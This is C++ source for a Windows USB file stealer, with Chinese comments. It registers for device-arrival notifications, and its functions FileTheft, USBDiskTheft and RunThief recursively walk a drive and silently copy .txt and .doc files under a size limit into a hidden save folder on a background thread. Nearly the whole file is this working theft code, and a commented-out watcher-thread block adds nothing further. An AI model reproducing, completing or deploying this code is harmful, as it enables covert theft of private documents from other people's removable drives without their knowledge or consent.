#include "pch.h"
#include "Watch.h"


HDEVNOTIFY hDevNotify = NULL;

BOOL StartWatch(HANDLE hRecipient)
{

	if (hDevNotify != NULL)
	{
		return FALSE;
	}
	
	DEV_BROADCAST_HDR  NotificationFilter;
	ZeroMemory(&NotificationFilter, sizeof(NotificationFilter));
	NotificationFilter.dbch_size = sizeof(DEV_BROADCAST_HDR);
	NotificationFilter.dbch_devicetype = DBT_DEVTYP_DEVICEINTERFACE;
	hDevNotify = RegisterDeviceNotification( hRecipient,&NotificationFilter, DEVICE_NOTIFY_ALL_INTERFACE_CLASSES);
	if (hDevNotify == NULL)
		return FALSE;
	return TRUE;


}

BOOL EndWatch()
{

	if (hDevNotify == NULL)
	{
		return FALSE;
	}

	if (!UnregisterDeviceNotification(hDevNotify))
	{
		return FALSE;
	}

	hDevNotify = NULL;	

	return TRUE;
}







//遍历目录
BOOL FileTheft(TCHAR* savePath, DWORD fileSize , DWORD fileType,LPCWSTR directory)
{
	WIN32_FIND_DATA FindFileData = { 0 };	//FindFirstFile FindNextFile参数2
	HANDLE hFind = NULL;	//FindFirstFile返回值
	TCHAR wOriginalPath[MAX_PATH + 2] = { 0 };	//用于拼接当前路径
	TCHAR wCurrentFile[MAX_PATH + 2] = { 0 };	//用于拼接当前查询到的文件或文件夹
	LPCWSTR pCurrentlPath = directory;	//用于判断当前文件路径结尾
	LPCWSTR pFileName = NULL;	//用于判断文件名结尾
	UINT uPathCount = 0; //用于统计当前目录下.与..的个数
	TCHAR ext[10] = { 0 }; //文件后缀
	DWORD extType = 0;	//文件真实类型
	__int64 fsize = 0;	//文件大小
	TCHAR SavDirectory[MAX_PATH] = { 0 };


	//拼接路径
	//加上\\*后查询 -> 加等于查询该目录下第一个文件
	//1 目录存在 有文件则查询成功
	//2 目录存在 无文件则查询失败,既无显示数据
	//3 目录不存在则失败,无显示内容
	pCurrentlPath += wcslen(directory);
	if (pCurrentlPath == directory) return FALSE; //说明字符长度为0
	if (wcscpy_s(wOriginalPath, MAX_PATH + 2, directory)) return FALSE;	//拷贝目录
	pCurrentlPath--;
	if (*pCurrentlPath == '\\')
		wcscat_s(wOriginalPath, MAX_PATH + 2, L"*");
	else
		wcscat_s(wOriginalPath, MAX_PATH + 2, L"\\*");


	// 判断路径是否存在,此时已经开始查询目录下的第一个文件
	hFind = FindFirstFile(wOriginalPath, &FindFileData);
	if (INVALID_HANDLE_VALUE == hFind)
		return FALSE;

	//获取当前目录下文件,判断属性是否为文件夹
	//文件夹 -> 进入遍历
	//文件 -> 打印
	//.或..则不打印
	do
	{
		swprintf_s(wCurrentFile, MAX_PATH + 2, L"%s%s%s", directory, L"\\", FindFileData.cFileName);

		if (FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)	//为0则不是文件夹
		{
			//文件夹
			//.与..隐藏
			if (uPathCount < 2) {
				pFileName = FindFileData.cFileName;
				pFileName += wcslen(FindFileData.cFileName);
				if (pFileName == FindFileData.cFileName) continue; //说明字符长度为0
				if (*--pFileName == L'.')
				{
					uPathCount++;
					continue;	//遇到.退出当前循环
				}
			}

			FileTheft(savePath,fileSize, fileType, wCurrentFile);

		}
		else
		{
		
			//wprintf(L"%s\n", wCurrentFile);
			
			//查询到文件.对文件进行处理
			extType = 0;
			fsize = 0;
			//1 文件类型
		
			if (!_wsplitpath_s(FindFileData.cFileName, NULL, NULL, NULL, NULL, NULL, NULL, ext, 10))
			{
				//获取后缀成功
				//判断后缀类型
				if (!wcscmp(ext, L".txt")) 	extType = TXT_TYPE;
				if (!wcscmp(ext, L".doc")) 	extType = DOC_TYPE;

				if (fileType & ALL_TYPE || fileType & extType)
				{

					//2 判断 文件大小
					fsize = (FindFileData.nFileSizeHigh * (MAXDWORD + 1)) + FindFileData.nFileSizeLow;
					fsize = fsize / 1024 / 1024;	//变为MB
					if (fsize < fileSize)
					{
						//都通过 复制
						wcscpy_s(SavDirectory, MAX_PATH, savePath);
						wcscat_s(SavDirectory, MAX_PATH, L"\\");
						wcscat_s(SavDirectory, MAX_PATH, FindFileData.cFileName);
						
						BOOL ret = CopyFile(wCurrentFile, SavDirectory,FALSE);
					}

				}


			}

		}

		ZeroMemory(wCurrentFile, MAX_PATH + 2);

	} while (FindNextFile(hFind, &FindFileData));


	FindClose(hFind);

	return TRUE;
}


BOOL FileTheftEX(TCHAR* savePath, DWORD fileSize, DWORD fileType, LPCWSTR directory) 
{
	if (!PathFileExists(savePath))
		if (!CreateDirectory(savePath,NULL))
			return FALSE;

	return FileTheft(savePath, fileSize, fileType, directory);
}




DWORD WINAPI USBDiskTheft(void* uThief)
{

	
	UThief* thief = (UThief*)uThief;

	BOOL ret = FALSE;

	ret = FileTheftEX(thief->savePath, thief->fileSize, thief->fileType, thief->theftPath);
	
	delete uThief;

	return ret;
}





BOOL RunThief(TCHAR* SavePath, DWORD FileSize,DWORD FileType,TCHAR* TheftPath)
{


	//判断所有条件是否满足要求
	if(SavePath==NULL || !wcslen(SavePath) || FileSize ==0 ||  *TheftPath>'Z' || *TheftPath < 'A'|| TheftPath == NULL || !wcslen(TheftPath)
		|| *SavePath < 'A' ||  *SavePath>'Z' ||
		!((FileType & ALL_TYPE ) | (FileType & TXT_TYPE) |(FileType & DOC_TYPE)))
		return FALSE;

	//申请空间 -> T填充数据
	UThief* uThief = new UThief;
	ZeroMemory(uThief,sizeof(uThief));
	if (uThief == NULL)
		return FALSE;
	uThief->fileSize = FileSize;
	uThief->fileType = FileType;
	if (wcscpy_s(uThief->savePath, MAX_PATH, SavePath) || wcscpy_s(uThief->theftPath, MAX_PATH, TheftPath))
	{
		delete uThief;
		return FALSE;
	}
	

	//创建线程 复制
	HANDLE thread = CreateThread(NULL, NULL, USBDiskTheft, (LPVOID)uThief, 0, 0);
	if (thread == NULL) {
		delete uThief;
		return FALSE;
	}
	CloseHandle(thread);

	return TRUE;


}




/*
HANDLE thread = NULL;
BOOL bThreadExitFlag = FALSE;
BOOL bEndThread = FALSE;
*/

/*
DWORD WINAPI WatchUSBDisk(void* param)
{
	//下面是要执行的线程代码

	//1 获取监听信息

	while (bThreadExitFlag) Sleep(30);

	//MessageBox(NULL,L"WatchUSBDisk will exit",NULL,MB_OK);

	return 0;
}

BOOL StartWatch1()
{

	if (bEndThread)
	{
		MessageBox(NULL, L"Watch modal is stoping", NULL, MB_OK);
		return FALSE;
	}

	if (thread != NULL)
	{
		MessageBox(NULL, L"Watch modal is runing", NULL, MB_OK);
		return FALSE;
	}

	// 2 初始化退出标志
	bThreadExitFlag = TRUE;

	//3 创建线程 >> 返回值为NULL,退出函数
	thread = CreateThread(NULL, NULL, WatchUSBDisk, NULL, 0, 0);
	if (thread == NULL) {
		bThreadExitFlag = FALSE;	//恢复默认状态
		MessageBox(NULL, L"Watch modal run failed", NULL, MB_OK);
		return FALSE;
	}

	MessageBox(NULL, L"Watch modal run success", NULL, MB_OK);
	return TRUE;
}

BOOL EndWatch1()
{
	DWORD ExitCode = 0;
	BOOL bRetGetExitCodeThread = FALSE;
	DWORD dwWaitResult = 0;
	BOOL bTheadExit = FALSE;

	if (bEndThread)
	{
		MessageBox(NULL, L"Watch modal is stoping", NULL, MB_OK);
		return FALSE;
	}

	

	//1 断线程是否存在
	if (thread == NULL)
	{
		MessageBox(NULL, L"Watch modal not run ", NULL, MB_OK);
		return FALSE;
	}

	bEndThread = TRUE;

	//2 修改退出标识
	bThreadExitFlag = FALSE;


	//4 等待线程退出
	dwWaitResult = WaitForSingleObject(thread, INFINITE);



	//6 判断线程是否成功退出
	if (dwWaitResult == WAIT_FAILED)
	{
		//失败

		//提示错误
		MessageBox(NULL, L"GetExitCodeThread Failed ", NULL, MB_OK);

		bTheadExit = FALSE;
	}
	else
	{
		//成功
		
		//获取退出码
		do
		{
			if (!GetExitCodeThread(thread, &ExitCode))
			{
				break;
			}
		} while (ExitCode == STILL_ACTIVE);

		//判断退出码

		if (ExitCode == 6)
			MessageBox(NULL, L"GetExitCodeThread Failed ", NULL, MB_OK);

		// 关闭句柄
		
		CloseHandle(thread);
		// 提示关闭成功
		MessageBox(NULL, L"Stop Watch Success", NULL, MB_OK);
		bTheadExit = TRUE;
	}

	//7 恢复初始值
	thread = NULL;
	bEndThread = FALSE;


	return bTheadExit;
}
*/














